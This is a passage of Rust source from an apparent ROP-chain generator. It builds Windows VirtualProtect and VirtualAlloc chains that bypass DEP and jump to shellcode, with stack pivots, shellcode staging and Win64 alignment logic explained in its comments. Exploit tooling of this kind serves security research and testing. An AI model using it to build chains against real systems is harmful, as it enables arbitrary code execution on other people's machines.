//! Windows VirtualProtect / VirtualAlloc chain builders (PLAN sec. 6.2).
//!
//! No ROPgadget oracle exists for these (ropmaker is Linux-only); the
//! design follows PLAN sec. 6.2 as hardened by the gadget-inventory spike
//! (`tests/spike-report.md`) and, since v0.5, by the emulator harness
//! (`tests/emulate.py`, `docs/chain-regressions.md`) — every claim below
//! is one an executed chain has been observed to satisfy.
//!
//!   * **Anchor-first API resolution**: an explicit `--api-addr` runtime
//!     address is strategy (a); the IAT dereference path (b) only applies
//!     when the PE actually imports the target API. Which API that is is
//!     the caller's choice (`--api-name`, CHWIN-06): the shipped cmd.exe
//!     fixtures import `VirtualAlloc`, `VirtualFree` and `VirtualQuery`
//!     and do NOT import `VirtualProtect`, so hardcoding the latter made
//!     the IAT path unreachable on every PE this project ships.
//!   * **Two argument recipes, not one** (CHWIN-06). `VirtualProtect` and
//!     `VirtualAlloc` take four arguments each, but they are not the same
//!     four: VirtualAlloc's third and fourth are `flAllocationType` and
//!     `flProtect`, so passing VirtualProtect's `(flNewProtect,
//!     &lpflOldProtect)` to it commits nothing and writes nowhere. The
//!     VirtualAlloc recipe is `(lpAddress, dwSize, MEM_COMMIT, flProtect)`
//!     — re-committing an already-committed page with a new protection,
//!     which is the DEP-bypass form that needs no out-parameter at all.
//!   * **Arg population survives pop scarcity**: per register, try
//!     `pop rX` first, then the `pop rax` + `mov rX, rax` fallback. When
//!     neither exists (the common case on real PEs — cmd.exe x64 cannot
//!     populate rdx/r8/r9 AT ALL with ret-terminated gadgets) the builder
//!     fails with a structured error naming every strategy tried, instead
//!     of emitting a DOA chain.
//!   * **The out-parameter never aliases the shellcode** (CHWIN-02).
//!     VirtualProtect writes a DWORD through `lpflOldProtect`; pointing it
//!     at the shellcode's own first bytes corrupts the entry point of the
//!     buffer the call just made RWX, and the chain then returns there.
//!     See [`resolve_addresses`].
//!   * **16-byte stack alignment at the call site** is a Chain IR
//!     invariant enforced through `validate_with` hooks, and it is
//!     achieved by placing a real bare-`ret` GADGET, never a data word
//!     (CHWIN-01): in a ret-chain the preceding gadget's `ret` *jumps to*
//!     the word it is handed, so an inert `0x4141…` pad is a crash, not a
//!     skip.
//!   * **Second-stack frame**: the word after the API transfer is the
//!     return address the API's own `ret` consumes — it points at the
//!     shellcode, so control continues after the call. 32 bytes of
//!     shadow space precede it (Win64 ABI).
//!
//! Win64 layout (word indices, after arg setup):
//!   [ret-gadget?] [api transfer] [return = shellcode] [shadow x4]
//!
//! The index the transfer word must occupy depends on where the chain's
//! own first word sits relative to a 16-byte boundary, which is a property
//! of the *delivery*, not of the binary — so it is a parameter
//! ([`ChainBaseParity`], `--chain-base`, CHWIN-04) rather than a silent
//! assumption. See [`ChainBaseParity`] for the arithmetic.
//!
//! Win32 (stdcall): no register setup at all —
//!   [api] [return = shellcode] [arg1] [arg2] [arg3] [arg4]
//! and the API's `ret 0x10` continues into the shellcode.

use rf_core::{Arch, PeImport};
use rf_scan::Gadget;
use serde::Serialize;

use crate::linux::{count_exact, find_exact, tail, ChainBuilder, DataSection};
use crate::plan::{ChainPlan, PlanBuilder, Strategy};
use crate::{arch_name, py_comment, ChainError, ChainWord, RopChain, WordKind};

const PADDING64: u64 = 0x4141_4141_4141_4141;
const PADDING32: u64 = 0x4141_4141;
/// PAGE_EXECUTE_READWRITE.
pub const DEFAULT_PROTECT: u64 = 0x40;
pub const DEFAULT_SHELLCODE_SIZE: u64 = 0x1000;
/// `MEM_COMMIT`: VirtualAlloc's `flAllocationType` for re-committing a page
/// that is already reserved and committed, which is how a VirtualAlloc
/// chain changes protection without an out-parameter.
pub const MEM_COMMIT: u64 = 0x1000;

/// Where the chain's own first word sits relative to a 16-byte boundary
/// (CHWIN-04).
///
/// The Win64 ABI requires `rsp % 16 == 8` on entry to a function — the
/// state a `call` leaves behind, having pushed its 8-byte return address
/// onto a 16-aligned stack. A ROP chain has no `call`, so the builder has
/// to arrange that state by choosing the index of the transfer word. With
/// the chain's first word at address `S`, the word at index `i` sits at
/// `S + 8*i`, and the `ret` that transfers into the API consumes word `j`,
/// so at entry `rsp = S + 8*(j+1)`.
///
/// That leaves `S mod 16`, which the binary cannot tell us and which the
/// pre-v0.5 builder hardcoded to 0 while calling it "the standard exploit
/// precondition". In the most common delivery — smashing a saved return
/// address — it is the opposite: the ABI puts `rsp % 16 == 0` immediately
/// before a `call`, so the pushed return address, i.e. the first word the
/// attacker controls, lives at an address `≡ 8 (mod 16)`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum ChainBaseParity {
    /// `S ≡ 0 (mod 16)`: the chain starts on a 16-byte boundary, e.g.
    /// after a pivot into a controlled, aligned buffer.
    Aligned,
    /// `S ≡ 8 (mod 16)`: the chain's first word replaces a saved return
    /// address. The default, because it is the common case.
    #[default]
    ReturnAddress,
}

impl ChainBaseParity {
    /// Every spelling either front end accepts, in both surfaces' style.
    pub const VALUES: &'static [&'static str] = &["aligned", "return-address", "return_address"];

    /// Parse a `--chain-base` / `chain_base` value. Case-insensitive, and
    /// `-` and `_` are interchangeable so the CLI's kebab spelling and the
    /// MCP's snake spelling are the same vocabulary (ECO-02).
    pub fn parse(s: &str) -> Option<ChainBaseParity> {
        match s.trim().to_ascii_lowercase().replace('_', "-").as_str() {
            "aligned" | "16" | "16-aligned" => Some(ChainBaseParity::Aligned),
            "return-address" | "retaddr" | "saved-return-address" => {
                Some(ChainBaseParity::ReturnAddress)
            }
            _ => None,
        }
    }

    /// The canonical (snake_case) name echoed into the chain IR.
    pub fn as_str(self) -> &'static str {
        match self {
            ChainBaseParity::Aligned => "aligned",
            ChainBaseParity::ReturnAddress => "return_address",
        }
    }

    /// `S mod 16`.
    pub fn base_mod16(self) -> u64 {
        match self {
            ChainBaseParity::Aligned => 0,
            ChainBaseParity::ReturnAddress => 8,
        }
    }

    /// `rsp % 16` at API entry when the transfer word is at index `j`.
    fn entry_rsp_mod16(self, j: usize) -> u64 {
        (self.base_mod16() + 8 * (j as u64 + 1)) % 16
    }

    /// The parity the transfer word's index must have for
    /// [`Self::entry_rsp_mod16`] to be 8.
    fn transfer_index_parity(self) -> usize {
        match self {
            ChainBaseParity::Aligned => 0,
            ChainBaseParity::ReturnAddress => 1,
        }
    }

    /// "even" / "odd", for error and comment text.
    fn parity_word(self) -> &'static str {
        if self.transfer_index_parity() == 0 {
            "even"
        } else {
            "odd"
        }
    }
}

/// Which four arguments the target API takes (CHWIN-06).
///
/// Both APIs take four, which is why the pre-v0.5 module header claimed
/// "VirtualAlloc works too — same arg count". Same *count*, different
/// *meaning*: arg3/arg4 are `(flNewProtect, &lpflOldProtect)` for one and
/// `(flAllocationType, flProtect)` for the other.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApiRecipe {
    /// `VirtualProtect(lpAddress, dwSize, flNewProtect, &lpflOldProtect)`.
    VirtualProtect,
    /// `VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)`.
    VirtualAlloc,
}

impl ApiRecipe {
    /// API names this builder can construct arguments for.
    pub const NAMES: &'static [&'static str] = &["VirtualProtect", "VirtualAlloc"];

    pub fn for_name(name: &str) -> Option<ApiRecipe> {
        if name.eq_ignore_ascii_case("VirtualProtect") {
            Some(ApiRecipe::VirtualProtect)
        } else if name.eq_ignore_ascii_case("VirtualAlloc") {
            Some(ApiRecipe::VirtualAlloc)
        } else {
            None
        }
    }

    /// Whether the recipe has a pointer out-parameter that the API writes
    /// through (CHWIN-02 only exists for a recipe that does).
    fn has_out_parameter(self) -> bool {
        matches!(self, ApiRecipe::VirtualProtect)
    }
}

/// The `PAGE_*` name of a protection constant, or its hex form.
fn protect_label(v: u64) -> String {
    match v {
        0x10 => "PAGE_EXECUTE".to_string(),
        0x20 => "PAGE_EXECUTE_READ".to_string(),
        0x40 => "PAGE_EXECUTE_READWRITE".to_string(),
        0x80 => "PAGE_EXECUTE_WRITECOPY".to_string(),
        0x02 => "PAGE_READONLY".to_string(),
        0x04 => "PAGE_READWRITE".to_string(),
        other => format!("{other:#x}"),
    }
}

/// Parameters for a Windows chain build.
#[derive(Debug, Clone)]
pub struct WinChainOpts {
    /// API to call. `VirtualProtect` (default) or `VirtualAlloc`; see
    /// [`ApiRecipe`], and note that the two do NOT take the same four
    /// arguments.
    pub api_name: String,
    /// Strategy (a): explicit runtime address of the API.
    pub api_addr: Option<u64>,
    /// Where the shellcode will live at runtime (default: the chosen
    /// writable section's vaddr — "shellcode in .data").
    pub shellcode_addr: Option<u64>,
    /// Region size argument (default 0x1000).
    pub shellcode_size: u64,
    /// flNewProtect / flProtect (default PAGE_EXECUTE_READWRITE = 0x40).
    pub new_protect: u64,
    /// What the builder may assume about the chain base's alignment
    /// (default [`ChainBaseParity::ReturnAddress`]).
    pub chain_base: ChainBaseParity,
    /// `CHWIN-08` #1: pivot the stack pointer here before the chain body
    /// runs. `None` (default) = no pivot; the chain is one contiguous
    /// piece placed at the overflow point.
    pub pivot: Option<u64>,
    /// `CHWIN-08` #5: shellcode bytes to WRITE into the region at
    /// `shellcode_addr` with write-what-where gadgets, instead of assuming
    /// somebody else already put them there. Empty (default) = assume.
    pub stage: Vec<u8>,
    /// `CHWIN-08` #2: further API calls composed after the first, in
    /// order, each `(api name, optional explicit runtime address)`. Empty
    /// (default) = a single-call chain.
    pub extra_calls: Vec<(String, Option<u64>)>,
    /// `CHWIN-08` #3: this image's own EXPORT table.
    ///
    /// It lives on the options rather than beside `imports` because it is
    /// the one piece of image data `rf-core` does not parse: the front end
    /// reads the export directory itself (rf-cli `pe_exports`) and hands
    /// the result down. Empty (default) = no export resolution, which is
    /// every target that is an executable rather than a library.
    pub exports: Vec<PeExport>,
}

/// One entry of a PE export directory, already rebased.
///
/// Strategy (c) at PLAN.md:192: when the target IS the module that exports
/// the API — a DLL, or a driver — its address is in the file and needs
/// neither a leak nor an IAT dereference, so the transfer costs one word
/// and no gadgets at all.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PeExport {
    pub name: String,
    /// `image_base + the export RVA`, with any `--base` rebase applied.
    pub vaddr: u64,
}

impl Default for WinChainOpts {
    fn default() -> Self {
        WinChainOpts {
            api_name: "VirtualProtect".to_string(),
            api_addr: None,
            shellcode_addr: None,
            shellcode_size: DEFAULT_SHELLCODE_SIZE,
            new_protect: DEFAULT_PROTECT,
            chain_base: ChainBaseParity::default(),
            pivot: None,
            stage: Vec::new(),
            extra_calls: Vec::new(),
            exports: Vec::new(),
        }
    }
}

/// What a generated Windows chain assumes about the world it will run in.
///
/// CHWIN-04: the alignment model used to be an unstated constant in the
/// source. Everything the builder decided *for* the user is reported back
/// to them — in the chain IR's `description`, in the emitted script's
/// preamble, and, machine-readably, here.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct WinAssumptions {
    /// The API whose argument recipe was used.
    pub api_name: String,
    /// `"aligned"` or `"return_address"`.
    pub chain_base_parity: &'static str,
    /// `S mod 16` implied by `chain_base_parity`.
    pub chain_base_mod16: u64,
    /// `CHWIN-08`: where the chain body must be placed, and how many
    /// leading words go at the overflow point instead. `None` when there
    /// is no pivot, i.e. the chain is one contiguous piece.
    #[serde(serialize_with = "hex_opt")]
    pub pivot_addr: Option<u64>,
    /// Words of the emitted chain that belong at the OVERFLOW POINT; the
    /// rest belong at `pivot_addr`. `0` when there is no pivot.
    pub pivot_words: usize,
    /// Where the chain believes the shellcode will be.
    #[serde(serialize_with = "hex")]
    pub shellcode_addr: u64,
    /// The writable DWORD the API writes its out-parameter through, when
    /// the recipe has one. `null` for VirtualAlloc, which has none.
    #[serde(serialize_with = "hex_opt")]
    pub old_protect_addr: Option<u64>,
}

fn hex<S: serde::Serializer>(v: &u64, s: S) -> Result<S::Ok, S::Error> {
    s.serialize_str(&format!("0x{v:x}"))
}

fn hex_opt<S: serde::Serializer>(v: &Option<u64>, s: S) -> Result<S::Ok, S::Error> {
    match v {
        Some(v) => s.serialize_str(&format!("0x{v:x}")),
        None => s.serialize_none(),
    }
}

fn word_size_of(arch: Arch) -> u64 {
    if arch == Arch::X64 {
        8
    } else {
        4
    }
}

/// `.data` by name, else the first writable section.
fn pick_writable(data_sections: &[DataSection]) -> Result<&DataSection, ChainError> {
    data_sections
        .iter()
        .find(|s| s.name == ".data" && s.writable)
        .or_else(|| data_sections.iter().find(|s| s.writable))
        .ok_or(ChainError::NoWritableSection)
}

/// Resolve `(shellcode_addr, old_protect_addr)` — CHWIN-02.
///
/// The pre-v0.5 builder used ONE address, the writable section's vaddr, for
/// both: the shellcode's home and `&lpflOldProtect`. VirtualProtect writes
/// the previous protection DWORD (typically `PAGE_READWRITE`, `04 00 00
/// 00`) through that pointer *after* changing the protection, and the
/// chain's second-stack frame then returns to the same address — so the
/// first instruction executed was assembled from the out-parameter, not
/// from the shellcode. The emulator observes exactly that:
/// `90909090 -> 04000000` (docs/chain-regressions.md, CHWIN-02).
///
/// The scratch DWORD is therefore chosen to be distinct:
///
/// 1. a writable section the protected region does not cover — the clean
///    case, and what you get whenever the image has a second writable
///    section or `--shellcode-addr` puts the shellcode somewhere other
///    than a section start;
/// 2. otherwise the LAST word of the region being made writable. It is the
///    only address the builder can *prove* is writable at the moment of
///    the write without knowing section sizes (which [`DataSection`] does
///    not carry): the caller has already asserted `[shellcode,
///    shellcode+dwSize)` is a valid region by passing it as `dwSize`, and
///    it is the furthest point in that region from the shellcode's entry.
fn resolve_addresses(
    data_sections: &[DataSection],
    arch: Arch,
    opts: &WinChainOpts,
) -> Result<(u64, u64), ChainError> {
    let data = pick_writable(data_sections)?;
    let shellcode = opts.shellcode_addr.unwrap_or(data.vaddr);
    let word = word_size_of(arch);
    // Guard the whole protected region, and at least one word of it, so a
    // `--shellcode-size 0` cannot make the "covered" test vacuous and hand
    // the aliasing bug straight back.
    let guard_end = shellcode.saturating_add(opts.shellcode_size.max(word));
    let scratch = data_sections
        .iter()
        .filter(|s| s.writable)
        .map(|s| s.vaddr)
        .find(|v| !(*v >= shellcode && *v < guard_end))
        .unwrap_or_else(|| {
            let span = opts.shellcode_size.max(2 * word);
            shellcode.saturating_add((span - word) & !(word - 1))
        });
    Ok((shellcode, scratch))
}

fn api_recipe(opts: &WinChainOpts) -> Result<ApiRecipe, ChainError> {
    ApiRecipe::for_name(&opts.api_name).ok_or_else(|| {
        ChainError::MissingGadget(format!(
            "unsupported api name {:?}: this builder knows the argument recipe of {} only \
             (they do not take the same four arguments, so guessing would emit a call with \
             the wrong ones)",
            opts.api_name,
            ApiRecipe::NAMES.join(" and ")
        ))
    })
}

/// What [`build_windows_virtualprotect`] would assume for these options —
/// the same computation the builder itself runs, so the two cannot drift.
pub fn windows_assumptions(
    data_sections: &[DataSection],
    arch: Arch,
    opts: &WinChainOpts,
) -> Result<WinAssumptions, ChainError> {
    let recipe = api_recipe(opts)?;
    let (shellcode, old_protect) = resolve_addresses(data_sections, arch, opts)?;
    Ok(WinAssumptions {
        api_name: opts.api_name.clone(),
        pivot_addr: opts.pivot,
        pivot_words: if opts.pivot.is_some() { PIVOT_WORDS } else { 0 },
        chain_base_parity: opts.chain_base.as_str(),
        chain_base_mod16: opts.chain_base.base_mod16(),
        shellcode_addr: shellcode,
        old_protect_addr: recipe.has_out_parameter().then_some(old_protect),
    })
}

/// One API call in the chain: which recipe, and how its address is found.
#[derive(Debug, Clone)]
pub struct ApiCall {
    pub name: String,
    pub recipe: ApiRecipe,
    /// Strategy (a) for THIS call. `None` = resolve through the IAT.
    pub addr: Option<u64>,
}

/// The call sequence: the primary `--api-name` / `--api-addr`, then
/// `extra_calls` in order (`CHWIN-08` #2).
fn api_calls(opts: &WinChainOpts) -> Result<Vec<ApiCall>, ChainError> {
    let mut out = vec![ApiCall {
        name: opts.api_name.clone(),
        recipe: api_recipe(opts)?,
        addr: opts.api_addr,
    }];
    for (name, addr) in &opts.extra_calls {
        let recipe = ApiRecipe::for_name(name).ok_or_else(|| {
            ChainError::MissingGadget(format!(
                "unsupported api name {name:?} in the call sequence: this builder knows the \
                 argument recipe of {} only",
                ApiRecipe::NAMES.join(" and ")
            ))
        })?;
        out.push(ApiCall {
            name: name.clone(),
            recipe,
            addr: *addr,
        });
    }
    Ok(out)
}

// ---------------------------------------------------------------------------
// CHWIN-08: stack pivot, shellcode staging, multi-call composition, x86 IAT
// ---------------------------------------------------------------------------

/// `CHWIN-08` #1: pivot rsp/esp to a controlled buffer before the chain body.
///
/// The overflow you have may be four words long while the chain you need is
/// forty. The standard answer is to put a two-word prologue at the overflow
/// point that moves the stack pointer into a bigger buffer you also control,
/// and to put the chain body there. Nothing in the pre-v0.5 builder consumed
/// the `pop rsp` / `xchg rsp, reg` inventory the spike counted.
///
/// The emitted chain is therefore in TWO pieces, and the layout contract is
/// part of the artefact rather than folklore: words `0..pivot_words` go at
/// the overflow point, words `pivot_words..` go at `--pivot`. Both
/// [`WinAssumptions`] and the script preamble say so.
///
/// Returns how many words the prologue took.
fn emit_pivot(
    b: &mut ChainBuilder,
    rev: &[&Gadget],
    arch: Arch,
    opts: &WinChainOpts,
) -> Result<usize, ChainError> {
    let Some(addr) = opts.pivot else {
        return Ok(0);
    };
    let sp = if arch == Arch::X64 { "rsp" } else { "esp" };
    let word = word_size_of(arch);
    if addr % word != 0 {
        return Err(ChainError::MissingGadget(format!(
            "--pivot {addr:#x} is not {word}-byte aligned; a stack pointer that is not \
             word-aligned cannot host a chain"
        )));
    }
    // `pop rsp ; ret`: the pop takes the new stack pointer straight off the
    // payload, and the `ret` then reads its target from the NEW stack -- so
    // the very next word of the chain is the body's first word, at `--pivot`.
    let pop = find_exact(rev, &format!("pop {sp}")).ok_or_else(|| {
        ChainError::MissingGadget(format!(
            "stack pivot: no clean-tailed `pop {sp}` gadget. A pivot has to load the stack \
             pointer from a word the chain supplies; `xchg {sp}, <reg>` and `leave` pivot to \
             a value the chain would first have to place in a register or in rbp, which this \
             builder does not model"
        ))
    })?;
    // A tail pop after `pop rsp` reads from the pivot TARGET, not from the
    // prologue, so it would eat the body's first word. The trailing `ret`
    // is fine and is the point: it reads its target from the new stack.
    if tail(pop).iter().any(|i| i.starts_with("pop ")) {
        return Err(ChainError::MissingGadget(format!(
            "stack pivot: `{}` pops again after `pop {sp}`, which would consume the first              word of the pivoted chain body instead of padding the prologue",
            pop.text()
        )));
    }
    b.gadget(pop);
    b.words.push(ChainWord {
        value: addr,
        kind: WordKind::DataAddr,
        comment: format!(
            "--pivot: new {sp}; the chain body below is placed HERE, not after this word"
        ),
        source_gadget: None,
    });
    Ok(b.words.len())
}

/// `CHWIN-08` #5: write the shellcode into the writable region with
/// write-what-where gadgets, instead of assuming somebody else put it there.
///
/// The Linux builder has written its `"/bin//sh"` into `.data` since v0.1;
/// the Windows builder just assumed the shellcode was already at `.data`,
/// which is the single largest thing the audit called "not there". This
/// reuses the same planner (`CHLX-01`'s `writer_candidates` + `emit_write`),
/// so staging gets the register-transfer and displacement fallbacks for
/// free.
fn emit_staging(
    b: &mut ChainBuilder,
    gadgets: &[Gadget],
    arch: Arch,
    opts: &WinChainOpts,
    shellcode: u64,
) -> Result<(), ChainError> {
    if opts.stage.is_empty() {
        return Ok(());
    }
    let word = word_size_of(arch) as usize;
    let regs: &[&str] = if arch == Arch::X64 {
        crate::linux::REGS64
    } else {
        crate::linux::REGS32
    };
    let anas = crate::linux::analyse(gadgets, arch, word);
    let ctx = crate::linux::Ctx {
        anas: &anas,
        gadgets,
        word,
        badbytes: &[],
    };
    let writers = crate::linux::writer_candidates(&ctx, regs);
    let w = writers.first().ok_or_else(|| {
        ChainError::MissingGadget(format!(
            "--stage needs a write-what-where gadget (`mov {} ptr [reg], reg`) to place \
             {} bytes of shellcode at {shellcode:#x}",
            if word == 8 { "qword" } else { "dword" },
            opts.stage.len()
        ))
    })?;
    for (i, chunk) in opts.stage.chunks(word).enumerate() {
        let mut buf = vec![0u8; word];
        buf[..chunk.len()].copy_from_slice(chunk);
        let mut value = 0u64;
        for (k, byte) in buf.iter().enumerate() {
            value |= (*byte as u64) << (8 * k);
        }
        let addr = shellcode + (i * word) as u64;
        crate::linux::emit_write(
            b,
            &ctx,
            w,
            addr,
            &format!("shellcode + {:#x}", i * word),
            value,
            WordKind::Immediate,
            &format!("staged shellcode word {i}"),
            &[],
        )?;
    }
    Ok(())
}

/// `CHWIN-08` #2: the return address of a non-final API call.
///
/// A single-call chain gives the API the shellcode's address as its return
/// address and is done. Composing a SECOND call means the API has to return
/// into the chain — and the chain's own runtime address is exactly what an
/// exploit does not know. The way real multi-call Windows chains solve this
/// (PLAN sec. 6.2 #4, "the hard part") is a stack-adjust gadget: the callee
/// returns into a gadget that discards the shadow space and whose own `ret`
/// picks the chain back up at the next word. No absolute address anywhere.
///
/// `slots` is how many words have to be discarded (4 shadow words on x64).
fn stack_adjust<'g>(
    rev: &[&'g Gadget],
    gadgets: &'g [Gadget],
    arch: Arch,
    slots: usize,
) -> Option<&'g Gadget> {
    // The literal form first: `add rsp, 0x20 ; ret`.
    let sp = if arch == Arch::X64 { "rsp" } else { "esp" };
    let bytes = slots * word_size_of(arch) as usize;
    for form in [
        format!("add {sp}, {bytes:#x}"),
        format!("add {sp}, {bytes}"),
    ] {
        if let Some(g) = find_exact(rev, &form) {
            return Some(g);
        }
    }
    // Otherwise any gadget whose model consumes exactly `slots` payload
    // words and then returns -- a run of `pop`s is the common shape.
    let word = word_size_of(arch) as usize;
    let anas = crate::linux::analyse(gadgets, arch, word);
    anas.iter()
        .find(|a| {
            a.model
                .as_ref()
                .is_some_and(|m| m.slots == slots && m.write.is_none())
        })
        .map(|a| a.g)
}

/// Words a `--pivot` prologue costs: the `pop rsp` gadget and the new
/// stack pointer it pops.
pub const PIVOT_WORDS: usize = 2;

/// The alignment model actually in force.
///
/// `--chain-base` describes where the chain's FIRST word sits. With a
/// `--pivot` the body does not start there: it starts at the pivot address,
/// which the caller told us exactly, so the parity is measured rather than
/// declared and `--chain-base` no longer applies to the body.
fn effective_parity(opts: &WinChainOpts) -> Result<ChainBaseParity, ChainError> {
    let Some(addr) = opts.pivot else {
        return Ok(opts.chain_base);
    };
    match addr % 16 {
        0 => Ok(ChainBaseParity::Aligned),
        8 => Ok(ChainBaseParity::ReturnAddress),
        r => Err(ChainError::MissingGadget(format!(
            "--pivot {addr:#x} is {r} mod 16; a Win64 chain body has to start at an address \
             that is 0 or 8 mod 16 for the ABI's `rsp % 16 == 8` entry condition to be \
             reachable at all (CHWIN-04)"
        ))),
    }
}

/// Build a Windows VirtualProtect-style chain. Dispatch mirrors the
/// ropmaker.py pattern: PE x86/x64 only.
pub fn build_windows_virtualprotect(
    gadgets: &[Gadget],
    data_sections: &[DataSection],
    imports: &[PeImport],
    arch: Arch,
    format: &str,
    opts: &WinChainOpts,
    badbytes: &[u8],
) -> Result<RopChain, ChainError> {
    if format != "pe" || !matches!(arch, Arch::X86 | Arch::X64) {
        return Err(ChainError::Unsupported {
            arch: arch_name(arch),
            format: format.to_string(),
        });
    }
    let calls = api_calls(opts)?;
    let parity = effective_parity(opts)?;
    // CHWIN-02: two DIFFERENT addresses. See resolve_addresses.
    let (shellcode, old_protect) = resolve_addresses(data_sections, arch, opts)?;

    let mut b = ChainBuilder::new(if arch == Arch::X64 {
        PADDING64
    } else {
        PADDING32
    });
    let rev: Vec<&Gadget> = gadgets.iter().rev().collect();

    // CHWIN-08 #1 and #5: the pivot prologue and the staging writes come
    // before anything the API call needs, because both change the state the
    // call runs in.
    let body_base = emit_pivot(&mut b, &rev, arch, opts)?;
    emit_staging(&mut b, gadgets, arch, opts, shellcode)?;

    let call_indices = match arch {
        Arch::X64 => build_win64(
            &mut b,
            gadgets,
            imports,
            &calls,
            shellcode,
            old_protect,
            opts,
            parity,
            body_base,
        )?,
        _ => build_win32(&mut b, &rev, imports, &calls, shellcode, old_protect, opts)?,
    };

    let prot = protect_label(opts.new_protect);
    let describe = |c: &ApiCall| -> String {
        match c.recipe {
            ApiRecipe::VirtualProtect => format!(
                "{}({:#x}, {:#x}, {prot}, &old @ {:#x})",
                c.name, shellcode, opts.shellcode_size, old_protect
            ),
            ApiRecipe::VirtualAlloc => format!(
                "{}({:#x}, {:#x}, MEM_COMMIT, {prot})",
                c.name, shellcode, opts.shellcode_size
            ),
        }
    };
    let call_text = calls
        .iter()
        .map(describe)
        .collect::<Vec<_>>()
        .join(" then ");
    // CHWIN-04: the assumption is part of the artefact, not a comment in
    // the source. `description` is what both front ends put in their JSON.
    let assumption = if arch == Arch::X64 {
        format!(
            "; assumes chain_base_parity={} (chain word 0 at an address = {} mod 16, so the \
             transfer word sits at an {} index and rsp % 16 == 8 at entry)",
            parity.as_str(),
            parity.base_mod16(),
            parity.parity_word()
        )
    } else {
        "; x86 stdcall: no 16-byte entry alignment requirement".to_string()
    };
    let staged = if opts.stage.is_empty() {
        String::new()
    } else {
        format!(
            "; stages {} bytes of shellcode into {:#x} with write-what-where gadgets",
            opts.stage.len(),
            shellcode
        )
    };
    let pivoted = match opts.pivot {
        Some(a) => format!(
            "; PIVOTED: place the first {PIVOT_WORDS} words at the overflow point and \
             everything after them at {a:#x}"
        ),
        None => String::new(),
    };
    let chain = RopChain {
        arch: arch_name(arch),
        description: format!(
            "Windows {call_text} then jump to shellcode{assumption}{staged}{pivoted}"
        ),
        // py_comment truncates the script preamble at PY_COMMENT_MAX (64),
        // so this line is kept inside that budget deliberately.
        script_comment: if arch == Arch::X64 {
            format!(
                "# {} chain (rop-finder); chain base: {}",
                opts.api_name,
                parity.as_str()
            )
        } else {
            format!(
                "# {} chain (rop-finder); stdcall, 4 stack args",
                opts.api_name
            )
        },
        word_size: word_size_of(arch) as usize,
        words: b.words,
        gadgets: b.gadgets,
    };

    let universe = RopChain::universe_from(gadgets);
    if arch == Arch::X64 {
        // PLAN sec. 6.2 invariant, now anchored to a DECLARED chain base
        // (CHWIN-04) instead of a hardcoded one, and checked at EVERY call
        // of a composed sequence rather than only the last (CHWIN-08):
        // rsp must satisfy the Win64 ABI's `rsp % 16 == 8` at each API
        // entry, or any `movaps` on the way in faults.
        let indices = call_indices.clone();
        let hook = move |c: &RopChain| -> Result<(), ChainError> {
            for &j in &indices {
                if j >= c.words.len() {
                    return Err(ChainError::InvalidWord {
                        index: j,
                        value: 0,
                        kind: WordKind::CodeAddr,
                        reason: "api call word index out of range".to_string(),
                    });
                }
                let got = parity.entry_rsp_mod16(j - body_base);
                if got != 8 {
                    return Err(ChainError::InvalidWord {
                        index: j,
                        value: c.words[j].value,
                        kind: c.words[j].kind,
                        reason: format!(
                            "stack misaligned at api call: with chain_base_parity={} (chain \
                             word 0 at an address = {} mod 16) rsp % 16 == {} at entry, \
                             Win64 requires 8 — declare the real chain base with \
                             --chain-base",
                            parity.as_str(),
                            parity.base_mod16(),
                            got
                        ),
                    });
                }
            }
            Ok(())
        };
        chain.validate_with(&universe, badbytes, &[&hook])?;
    } else {
        chain.validate(&universe, badbytes)?;
    }
    Ok(chain)
}

/// The four argument registers in call order, with the values this recipe
/// wants in them (CHWIN-06: the two recipes differ in arg3 and arg4).
fn win64_args(
    recipe: ApiRecipe,
    opts: &WinChainOpts,
    shellcode: u64,
    old_protect: u64,
) -> [(&'static str, u64, String); 4] {
    let prot = protect_label(opts.new_protect);
    match recipe {
        ApiRecipe::VirtualProtect => [
            ("rcx", shellcode, "arg1 lpAddress (shellcode)".to_string()),
            ("rdx", opts.shellcode_size, "arg2 dwSize".to_string()),
            ("r8", opts.new_protect, format!("arg3 flNewProtect {prot}")),
            (
                "r9",
                old_protect,
                "arg4 lpflOldProtect (writable scratch, NOT the shellcode)".to_string(),
            ),
        ],
        ApiRecipe::VirtualAlloc => [
            ("rcx", shellcode, "arg1 lpAddress (shellcode)".to_string()),
            ("rdx", opts.shellcode_size, "arg2 dwSize".to_string()),
            (
                "r8",
                MEM_COMMIT,
                "arg3 flAllocationType MEM_COMMIT".to_string(),
            ),
            ("r9", opts.new_protect, format!("arg4 flProtect {prot}")),
        ],
    }
}

/// The four stdcall stack arguments, in push order.
fn win32_args(
    recipe: ApiRecipe,
    opts: &WinChainOpts,
    shellcode: u64,
    old_protect: u64,
) -> [(u64, String); 4] {
    let prot = protect_label(opts.new_protect);
    match recipe {
        ApiRecipe::VirtualProtect => [
            (shellcode, "arg1 lpAddress (shellcode)".to_string()),
            (opts.shellcode_size, "arg2 dwSize".to_string()),
            (opts.new_protect, format!("arg3 flNewProtect {prot}")),
            (
                old_protect,
                "arg4 lpflOldProtect (writable scratch, NOT the shellcode)".to_string(),
            ),
        ],
        ApiRecipe::VirtualAlloc => [
            (shellcode, "arg1 lpAddress (shellcode)".to_string()),
            (opts.shellcode_size, "arg2 dwSize".to_string()),
            (MEM_COMMIT, "arg3 flAllocationType MEM_COMMIT".to_string()),
            (opts.new_protect, format!("arg4 flProtect {prot}")),
        ],
    }
}

/// Populate one argument register. Strategy 1: `pop rX`; strategy 2
/// (fallback): `pop rax` + `mov rX, rax`. Errors name both strategies.
fn set_arg64(
    b: &mut ChainBuilder,
    rev: &[&Gadget],
    reg: &str,
    value: u64,
    comment: &str,
    already_set: &mut Vec<(String, u64)>,
) -> Result<(), ChainError> {
    let as_refs: Vec<(&str, u64)> = already_set.iter().map(|(r, v)| (r.as_str(), *v)).collect();
    if let Some(pop) = find_exact(rev, &format!("pop {reg}")) {
        b.gadget(pop);
        b.data(value, comment.to_string());
        b.padding(pop, &as_refs);
        already_set.push((reg.to_string(), value));
        return Ok(());
    }
    // Fallback: route the value through rax (pop rax ; mov rX, rax).
    if let (Some(pop_rax), Some(mov)) = (
        find_exact(rev, "pop rax"),
        find_exact(rev, &format!("mov {reg}, rax")),
    ) {
        b.gadget(pop_rax);
